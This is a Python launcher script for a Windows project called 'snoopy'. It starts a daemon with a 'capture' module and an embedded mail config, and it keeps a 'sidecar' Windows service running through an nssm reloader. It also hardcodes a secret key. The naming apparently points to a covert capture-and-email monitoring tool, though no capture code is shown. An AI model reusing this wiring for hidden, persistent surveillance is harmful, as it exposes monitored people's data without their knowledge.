from lib.daemon import Daemon
from lib.file_finder import get_embedded_filename
from win32.killer import GracefulKiller
from win32.service_reloader import ServiceReloader
from win32 import capture as catcher
import threading

directory         = 'C:\\Users\\Reed\\code\\snoopy'
snoopy_path       = r'{}\dist\snoopy'.format(directory)
sidecar_path      = r'{}\dist\sidecar'.format(directory)
installation_path = r'{}\dist'.format(directory)
secret_key        = 'cHdk'
mail_config       = 'mail.config'
service           = 'sidecar'


class MyDaemon(Daemon):
    def __init__(self):
        Daemon.__init__(
            self,
            get_embedded_filename(mail_config),
            secret_key,
            installation_path,
            directory,
            catcher)

    def should_execute(self):
        return True

    def setup(self):
        pass


def create_reloader():
    ServiceReloader(
        r'{}\nssm.exe'.format(snoopy_path),
        service,
        directory,
        [r'{}\{}.exe'.format(sidecar_path, service)],
        7111
    )


if __name__ == "__main__":
    t = threading.Thread(target=create_reloader)
    t.daemon = True
    t.start()
    killer = GracefulKiller(
        MyDaemon(),
        7110)
    killer.run()
